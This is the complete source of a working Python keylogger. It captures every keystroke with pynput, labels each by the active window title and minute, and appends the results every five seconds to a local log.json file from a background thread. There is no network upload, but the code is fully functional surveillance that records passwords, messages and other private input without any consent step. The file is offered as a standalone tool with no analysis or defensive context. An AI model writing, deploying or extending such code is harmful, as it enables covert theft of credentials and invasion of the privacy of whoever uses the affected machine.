import time
import json
import threading
import signal
import atexit
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw

class KeyLoggerService:
    """
    Handles key logging functionality, including storing and retrieving logged keys.
    """
    def __init__(self):
        self.data = {}
        self.running = False

    def start_logging(self):
        """
        Starts the key logging process by setting the running flag to True.
        """
        self.running = True

    def stop_logging(self):
        """
        Stops the key logging process by setting the running flag to False.
        """
        self.running = False
        print("\nStopping Keylogger...")

    def get_logged_keys(self):
        """
        Retrieves the logged keys and clears the buffer.
        
        Returns:
            dict: A copy of the logged key data.
        """
        data = self.data.copy()
        self.data.clear()
        return data

    def get_keyword(self, key):
        """
        Handles key press events and stores them in a structured dictionary.
        
        Args:
            key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key pressed.
        """
        if not self.running:
            return

        window = self._get_window()
        if window not in self.data:
            self.data[window] = {}

        time_stamp = self._get_time()
        if time_stamp not in self.data[window]:
            self.data[window][time_stamp] = ""

        if hasattr(key, 'char') and key.char is not None:
            self.data[window][time_stamp] += key.char
        elif key == keyboard.Key.space:
            self.data[window][time_stamp] += " "
        else:
            self.data[window][time_stamp] += f" [{key}] "

    def _get_time(self):
        """
        Returns the current time formatted as YYYY-MM-DD HH:MM.
        """
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    def _get_window(self):
        """
        Retrieves the title of the active window.
        
        Returns:
            str: The title of the active window or "Unknown Window" if unavailable.
        """
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"

class FileWriter:
    """
    Handles writing logged data to a JSON file.
    """
    def send_data(self, data, machine_name):
        """
        Writes the collected key log data to a JSON file.
        
        Args:
            data (dict): The logged data structured by window and timestamp.
            machine_name (str): The name of the machine to store logs under.
        """
        try:
            with open("log.json", "r") as file:
                try:
                    origin_data = json.load(file)
                except json.JSONDecodeError:
                    origin_data = {}
        except FileNotFoundError:
            origin_data = {}

        for window, timestamps in data.items():
            origin_data.setdefault(window, {})
            for time_stamp, text in timestamps.items():
                origin_data[window].setdefault(time_stamp, "")
                origin_data[window][time_stamp] += text

        with open("log.json", "w") as file:
            json.dump(origin_data, file, indent=4)

class KeyLoggerManager:
    """
    Manages the execution of the key logger, including starting, stopping, and data storage.
    """
    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.listener = keyboard.Listener(on_press=self.service.get_keyword)
        atexit.register(self.cleanup)  # Ensures cleanup on forced exit

    def start(self):
        """
        Starts the key logging process and continuously logs data every 5 seconds.
        """
        self.service.start_logging()
        self.listener.start()
        print("Keylogger is starting!")

        try:
            while self.service.running:
                time.sleep(5)
                data = self.service.get_logged_keys()
                if data:
                    self.writer.send_data(data, "Machine_Name")
        except KeyboardInterrupt:
            print("\nStopping Keylogger...")
            self.service.stop_logging()
            self.listener.stop()

        print("Keylogger has stopped.")

    def cleanup(self):
        """
        Ensures the key logger stops properly when the program exits.
        """
        self.service.stop_logging()
        self.listener.stop()
        print("Keylogger has stopped.")

if __name__ == "__main__":
    manager = KeyLoggerManager()
    thread = threading.Thread(target=manager.start, daemon=True)
    thread.start()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\nShutting down...")
        manager.service.stop_logging()
        thread.join()
